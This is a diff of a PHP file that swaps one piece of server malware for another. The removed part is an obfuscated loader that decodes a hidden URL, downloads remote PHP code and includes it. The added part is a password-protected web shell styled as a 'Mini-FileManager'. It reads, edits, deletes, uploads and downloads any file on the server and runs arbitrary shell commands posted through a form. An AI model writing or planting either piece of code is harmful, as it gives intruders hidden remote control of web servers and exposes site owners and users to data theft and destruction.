@@ -1,103 +1,281 @@
 <?php
-
-$password = '$2y$08$PBo/wqoLayTvFOW2Hp4wh.emo68HEEAh4cJpw3WSr1TrJYuD/gEju';
-
-function encrypt($text, $key)
-{
-    $textLen = strlen($text);
-
-    for($x = 0; $x < $textLen; $x++) {
-        $text[$x] = ($text[$x] ^ $key);
+//
+//
+//vars
+//
+//
+	error_reporting(0);
+	session_start();
+	define('password', 'UnM@SK');
+	$head = '<head><meta name="viewport" content="width=device-width, 
+initial-scale=1.0"/><title>Mini-FileManager</title><style>pre{border:1px solid 
+#ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px 
+solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
+//
+//
+//controllers functions
+//
+//
+	
+	function has($obj){
+		return isset($obj);
+	}
+	function dd($text){
+		die($text);
+	}
+    function get_session($name){
+        return has($_SESSION[$name]) ? $_SESSION[$name] : false;
     }
-    return $text;
-}
-function decrypt($text, $key)
-{
-    return encrypt($text, $key);
-}
-function stringTohex($field)
-{
-    global $password;
-    $field = encrypt($field, $password);
-    $hexField = bin2hex($field);
-    $hexField = chunk_split($hexField, 2, '\\x');
-    $hexField = '\\x' . substr($hexField, 0, -2);
-    return $hexField;
-}
-function hexTostring($field)
-{
-    global $password;
-    $binaryField = explode('\\x', $field);
-    $binaryField = implode('', $binaryField);
-    $binaryField = hex2bin($binaryField);
-    return decrypt($binaryField, $password);
-}
-
-$fgc = hexTostring('\x42\x4d\x48\x41\x7b\x43\x41\x50\x7b\x47\x4b\x4a\x50\x41\x4a\x50\x57');
-$fpc = hexTostring('\x42\x4d\x48\x41\x7b\x54\x51\x50\x7b\x47\x4b\x4a\x50\x41\x4a\x50\x57');
-$fo = hexTostring('\x42\x4b\x54\x41\x4a');
-$fw = hexTostring('\x42\x53\x56\x4d\x50\x41');
-$fc = hexTostring('\x42\x47\x48\x4b\x57\x41');
-$fnce = hexTostring('\x42\x51\x4a\x47\x50\x4d\x4b\x4a\x7b\x41\x5c\x4d\x57\x50\x57');
-$ci = hexTostring('\x47\x51\x56\x48\x7b\x4d\x4a\x4d\x50');
-$cs = hexTostring('\x47\x51\x56\x48\x7b\x57\x41\x50\x4b\x54\x50');
-$ce = hexTostring('\x47\x51\x56\x48\x7b\x41\x5c\x41\x47');
-$cc = hexTostring('\x47\x51\x56\x48\x7b\x47\x48\x4b\x57\x41');
-$lnk = '\x4c\x50\x50\x54\x57\x1e\x0b\x0b\x43\x4d\x57\x50\x0a\x43\x4d\x50\x4c\x51\x46\x51\x57\x41\x56\x47\x4b\x4a\x50\x41\x4a\x50\x0a\x47\x4b\x49\x0b\x67\x52\x45\x56\x15\x1d\x1c\x10\x0b\x14\x12\x15\x1c\x13\x15\x15\x13\x12\x12\x1d\x12\x17\x10\x14\x16\x1d\x47\x10\x14\x12\x41\x10\x16\x41\x47\x40\x15\x1d\x17\x11\x46\x0b\x56\x45\x53\x0b\x13\x46\x11\x13\x45\x46\x13\x42\x47\x14\x14\x13\x10\x17\x45\x41\x12\x17\x45\x11\x13\x45\x13\x42\x10\x17\x1d\x17\x12\x14\x40\x46\x12\x12\x12\x41\x1d\x12\x45\x11\x0b\x5c\x48\x49\x56\x54\x47\x0a\x54\x4c\x54';
-
-
-function cUrl($url) {
-    global $cs, $ci, $cc, $ce, $fnce;
-    if(!$fnce('curl')) return;
-
-    $ch = $ci();
-    $cs($ch, CURLOPT_RETURNTRANSFER, true);
-    $cs($ch, CURLOPT_URL, $url);
-    $cs($ch, CURLOPT_SSL_VERIFYHOST, false);
-    $cs($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $res = $ce($ch);
-    $cc($ch);
-    return $res;
-}
-
-
-function tulisFile($fileName, $fileContent)
-{
-    global $fnce, $fpc, $fo, $fw, $fc;
-    if ($fnce('file_put_contents')) {
-        @$fpc($fileName, $fileContent);
-    } elseif ($fnce('fopen')) {
-        $f = @$fo($fileName, 'wb+');
-        $status = $f;
-        @$fw($f, $fileContent);
-        @$fc($f);
-        return $status;
+    function set_session($name,$val){
+        $_SESSION[$name] = $val;
     }
-}
-function bukaFile($fileName)
-{
-    global $fgc, $fnce, $fo, $fc;
-    if ($fnce('file_get_contents')) {
-        return @$fgc($fileName);
-    } elseif ($fnce("fopen")) {
-        $fh = @$fo($fileName, "rb+");
-        $fc($fh);
-        return $fh;
+    function get_post($name){
+        return has($_POST[$name]) ? $_POST[$name] : false;
     }
-}
+    function get_get($name){
+        return has($_GET[$name]) ? $_GET[$name] : false;
+    }
+    function makeInput($type,$name,$val = "", $style = ""){
+        if(in_array($type,['text','password','submit','file'])){
+            return "<input type='$type' name='$name' value='$val' style='$style'/>";
+		}
+        return "<$type name='$name' style='$style'>$val</$type>";
+    }
+    function makeForm($method, $inputArray,$file = ""){
+        $form = "<form method=$method enctype='$file'>"; 
+        foreach($inputArray as $key=>$val){
+            $form .= makeInput($key,(is_array($val) ? $val[0] : $val), (has($val[1]) ? $val[1] : ""), 
+(has($val[2]) ? $val[2] : ""));
+        }
+        return $form."</form>";
+    }
+    function makeTable($thead,$tbody){
+        $head = "";
+        foreach($thead as $th){
+            $head .= "<th>$th</th>";
+        }
+        $body = "";
+        foreach($tbody as $tr){
+            $body .= "<tr>";
+            foreach($tr as $td){
+                $body .= "<td>$td</td>";
+            }
+            $body .= "</tr>";
+        }
+        return "<table><thead>$head</thead><tbody>$body</tbody></table>";
+    }
+	function makeLink($link,$text,$target = ""){
+		return "<a href='$link' target='$target'>$text</a> ";
+	}
+    function login(){
+        if(get_session('login')){
+            return true;
+		}
+        if(!get_post('login')){
+            return false;
+		}
+        if(get_post('pass') != password){
+            return false;
+		}
+        set_session('login',true);
+        return true;
+    }
+    function get_path(){
+        $path = __dir__;
+        if(get_get('path')){
+            $path = get_get('path');
+		}
+        return $path;
+    }
+    function filesize_convert($bytes){
+        $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
+        for($i = 0; $bytes >= 1024 && $i < (count($label) -1); $bytes /= 1024, $i++);
+        return(round($bytes, 2) . " " . $label[$i]);
+    }
+    function fileTime($path){
+        return date("M d Y H:i:s", filemtime($path));
+    }
+	function download_file($download){
+		if(!is_file($download)){
+			return false;
+		}
+		header('Content-Type: application/octet-stream');
+		header('Content-Transfer-Encoding: Binary');
+		header('Content-disposition: attachment; filename="'.basename($download).'"');
+		return readfile($download);
+	}
+	function delete_file($delete){
+		if(is_file($delete)){
+			return unlink($delete);
+		}
+		if(is_dir($delete)){
+			return rmdir($delete);
+		}
+		return false;
+	}
+	function edit_file($edit){
+		if(is_file($edit)){
+			return makeForm('POST',
+				
+['textarea'=>['edit',htmlentities(file_get_contents($edit)),"width:100%;height:90%"],
+				'submit'=>['save','Save']]);
+		}
+		return false;
+	}
+	function save_edit($path,$str){
+		if(is_file($path)){
+			file_put_contents($path,html_entity_decode($str));
+			return true;
+		}
+		return false;
+	}
+	function view_file($path){
+		if(is_file($path)){
+			return htmlentities(file_get_contents($path));
+		}
+		return false;
+	}
+	function new_file($path,$name){
+		if(!is_file($path.'/'.$name)){
+			file_put_contents($path.'/'.$name,"");
+			return true;
+		}
+		return false;
+	}
+	function new_dir($path,$name){
+		if(!is_dir($path.'/'.$name)){
+			mkdir($path.'/'.$name);
+			return true;
+		}
+		return false;
+	}
+	function upload_file($path,$file){
+		$name = basename($file['name']);
+		if(!is_file($path.'/'.$name)){
+			if(move_uploaded_file($file["tmp_name"], $path.'/'.$name)){
+				return true;
+			}
+		}
+		return false;
+	}
+	function get_back($path){
+		if($path == "" || $path == "/"){
+			return $path;
+		}
+		$path = explode("/",str_replace('\\','/',$path));
+		array_pop($path);
+		return implode("/",$path);
+	}
+	function win_disk(){
+		exec("wmic logicaldisk get caption",$c);
+		$ret = "";
+		foreach($c as $d)
+			$ret .= ($d != "Caption" ? makeLink("?path=$d",$d) : "");
+		return $ret;
+	}
+    function get_dir(){
+		$path = get_path();
+		if(!is_dir($path)){
+			return false;
+		}
+		$dir = scandir($path);
+        $files = [];
+        $i = 0;
+        foreach($dir as $d){
+            if($d == '.' || $d == '..'){
+                continue;
+			}
+            $p = $path.'/'.$d;
+            $s = '--';
+            $icon = "&#128193;";
+            $t = fileTime($p);
+            $l = makeLink("?path=$p",$d);
+			$perms = substr(sprintf("%o", fileperms($p)),-4);
+			$owner =  (function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : 
+fileowner($p));
+			$controller = 
+				(is_file($p) ? makeLink("?edit=$p","Edit","_blank") : '').
+				makeLink("?delete=$p","Delete","_blank").
+				(is_file($p) ? makeLink("?download=$p","Download","_blank") : '');
+            if(is_file($p)){
+                $s = filesize_convert(filesize($p));
+                $icon = "&#128221;";
+            }
+            $files[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
+            $i++;
+        }
+        return makeTable(['#','id','Filename','Size','Modified','Perms','Owner',''],$files);
+    }
 
-$rootServer = $_SERVER['DOCUMENT_ROOT'];
-$tmpPath = sprintf('%s%s%s%s', sys_get_temp_dir(), DIRECTORY_SEPARATOR, md5($_SERVER['HTTP_HOST']), '.php');
-$link = hexTostring($lnk);
-$contents = bukaFile($link);
+	
+	$loginTemplate = makeForm('POST',['p'=>['','Password(default admin): '],'password'=>['pass', 
+''],'submit'=>['login','Login']]);
+	if(!login()){
+				dd($loginTemplate);
+	}
+	if(get_get("delete")){
+		delete_file(get_get("delete")) ? dd("Deleted: ".get_get("delete")) : dd("File not found");
+	}
+	if(get_get("edit")){
+		if(get_post('save')){
+			save_edit(get_get('edit'),get_post('edit'));
+			echo "Saved";
+		}
+		$edit = edit_file(get_get("edit"));
+		$edit ? dd($edit) : dd("File not found");
+	}
+	if(get_get('download')){
+		@readfile(download_file(get_get('download')));
+		exit();
+	}
+	if(get_post('newfile')){
+		new_file(get_path(),get_post('filename')) ? dd('Create: '.get_post('filename')) : dd('File 
+exites');
+	}
+	if(get_post('newdir')){
+		new_dir(get_path(),get_post('dirname')) ? dd('Create: '.get_post('dirname')) : dd('Dir exites');
+	}
+	if(get_post('upload')){
+		upload_file(get_path(),$_FILES['file']) ? dd('upload: '. $_FILES['file']['name']) : dd('Upload 
+Error');
+	}
+	
+	echo $head.
+		"<body>".
+		makeForm('POST',['text'=>['filename','File Name'],'submit'=>['newfile','Create']]).
+		makeForm('POST',['text'=>['dirname','Dir Name'],'submit'=>['newdir','Create']]).
+		makeForm('POST',['file'=>'file','submit'=>['upload','Upload']],'multipart/form-data').
+		"<form method='post'><input type='text' name='c' placeholder='kali linux'></input>
+ <button type='submit' name='s4dness'>>></button></form>";
 
-if(!$contents) {
-    $contents = cUrl($link);
-}
-
-if(!file_exists($tmpPath) || filesize($tmpPath) == 0) {
-
-    tulisFile($tmpPath, $contents);
-}
-
-include($tmpPath);
+ 		$viewCommandResult = '';
+		if(isset($_POST['s4dness'])){
+			$command = $_POST['c'];
+       		$descriptorspec = [
+            	0 => ['pipe', 'r'],
+            	1 => ['pipe', 'w'],
+            	2 => ['pipe', 'w']
+       		];
+        	$process = proc_open($command, $descriptorspec, $pipes);
+        	if (is_resource($process)) {
+            	$output = stream_get_contents($pipes[1]);
+            	$errors = stream_get_contents($pipes[2]);
+            	fclose($pipes[1]);
+            	fclose($pipes[2]);
+            	proc_close($process);
+            	if (!empty($errors)) {
+               		echo $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . 
+htmlspecialchars($errors) . '</textarea><br>';
+            	} else {
+                	echo $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . 
+htmlspecialchars($output) . '</textarea><br>';
+            	}
+        	} else {
+            	echo $viewCommandResult = '<hr><p>Error: Failed to execute command!</p><br>';
+        	}
+		}
+	echo makeLink("?path=".get_back(get_path()),"[Back]").
+		(PHP_OS_FAMILY == "Windows" ? win_disk() : "").
+		(is_dir(get_path()) ? get_dir() : '<pre>'.view_file(get_path()).'</pre>')
+		
+		."</body>";
